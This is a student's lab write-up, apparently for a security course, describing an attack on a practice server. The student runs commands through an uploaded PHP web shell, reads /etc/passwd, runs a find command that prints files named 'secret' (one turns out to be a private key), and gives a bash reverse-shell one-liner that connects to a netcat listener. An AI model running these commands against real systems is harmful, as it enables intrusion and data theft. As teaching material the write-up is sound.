Monday, 2024-10-28

Changwoo Yu


PART 1: INSTALLING A PHP WEB SHELL
==================================

whoami
------

After uploading the web shell (mine is name yuc3-webshellv2.php), you can run whoami command by introducing arguments by appending '?command=whoami' at the end of the url:
```
http://danger.jeffondich.com/uploadedimages/yuc3-webshellv2.php?command=whoami
```
As a result, you get
```
www-data
```

Pre tag
-------

The <pre> tag defines a pre-formatted text, which preserves white spaces. While you can get results of the commands, the output will not be formatted.

PART 2: LOOKING AROUND
======================

pwd
---

The directory is located in:
```
/var/www/danger.jeffondich.com/uploadedimages
```

home
----

To find all the user accounts, list the available directory /home. All the user accounts are:
```
bullwinkle
jeff
```

/etc/passwd
-----------

It appears that I should have reading permission, for the reading bit is set for all other users for the /etc/passwd file:
```
-rw-r--r-- 1 root     root       1936 Oct 24 21:43 passwd
```
Open the file 
```
cat /etc/*passwd
```
The file contains the following information: 
- User name
- Encrypted password
- UID
- GID
- Full name of the user
- User home directory
- Login shell

Some examples:
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
```

/etc/shadow
-----------

I don't have reading permission, for the reading bit is not set for all other users for the file:
```
-rw-r--r-- 1 root     root       1936 Oct 24 21:43 passwd
```
From online searching, /etc/shadow file contains
- Username
- Hashed password
- Other relative information regarding password changes, expiration dates, etc.

Secret Files
------------
Through the command:
```
find / -name "*secret*" -type f -exec sh -c 'echo {}; cat {}' \;
```

### /home/jeff/youfoundme.txt

```
This isn't the secret, but hi!
```

### /opt/more-secrets.txt

```
Oh look. You found me!
```

### /opt/.even-more-secrets.txt

```
Aw, a little period couldn't hide me? So sad.
```

### /home/jeff/supersecret.txt
```
Congratulations!

/   \          /   \
\_   \        /  __/
 _\   \      /  /__
 \___  \____/   __/
     \_       _/
       | @ @  \_
       |
     _/     /\
    /o)  (o/\ \_
    \_____/ /
      \____/

https://www.asciiart.eu/animals/moose
```
### /var/lib/fwupd/pki/secret.key

Seems to be an RSA private key.

### /var/www/danger.jeffondich.com/secrets/kindasecret.txt

```
Congratulations!
            _   _
           (.)_(.)
        _ (   _   ) _
       / \/`-----'\/ \
     __\ ( (     ) ) /__
     )   /\ \._./ /\   (
      )_/ /|\   /|\ \_(

by Joan Stark, https://www.asciiart.eu/animals/frogs
```

### /var/www/danger.jeffondich.com/youwontfindthiswithgobuster/secret.txt

```
Congratulations!
   ___     ___
  (o o)   (o o)
 (  V  ) (  V  )
/--m-m- /--m-m-

https://www.asciiart.eu/animals/birds-land
```

PART 3,4 LAUNCHING A REVERSE SHELL
==================================

ip of Kali VM
-------------

Run the following command in the Kali VM shell:
```
ifconfig eth0 | grep inet | head -1 | awk '{print $2}'
```

ip of Host OS
-------------

```
ifconfig en0 | grep -E "inet " | head -1 | awk '{print $2}' 
```

HTTP URL encodings
------------------

```
%20 = space character
%3E = > 
%26 = & 
%22 = " 
```

How reverse shell works
-----------------------

First, open a nc connect on your host machine using:
```
nc -l [PORT] # since I'm using Unix
```

Then, run the following command that's executed via browser on the Kali VM:
```
/bin/bash -c "bash -i >& /dev/tcp/10.133.0.49/6666 0>&1"
```
The command starts bash in interactive mode and redirects stdout and stderr to the TCP socket that is connected to 10.133.0.49 and redirects stdin to stdout. 

This way, all the outputs and errors from the VM shell will be sent over to the Host's terminal via nc.  

By redirecting stdin to stdout, VM shell awaits for data from stdout, which is connected to the Host's terminal via nc.   

In short, the data you type in you host machine get sent over to kali VM through TCP, which gets piped into stdin of the shell. Then, the shell will fork a process to execute some command, take stdout and stderr and send them over to the TCP socket. As a result, the host will be able to see the outputs of the command.
